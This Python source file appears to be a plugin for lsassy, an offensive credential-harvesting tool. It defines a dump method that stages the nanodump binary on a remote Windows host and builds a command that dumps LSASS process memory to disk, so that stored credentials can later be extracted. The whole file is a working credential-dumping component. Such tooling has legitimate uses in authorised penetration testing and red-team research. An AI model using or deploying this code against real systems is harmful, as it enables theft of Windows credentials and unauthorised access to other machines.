from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):

    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.nanodump = Dependency("nanodump", "nanodump.exe")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.nanodump])

    def clean(self):
        self.clean_dependencies([self.nanodump])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{} -v --write C:\\{}{}""".format(
            self.nanodump.get_remote_path(),
            self.dump_path, self.dump_name
        )
        return {
            "cmd": cmd_command,
            "pwsh": cmd_command
        }
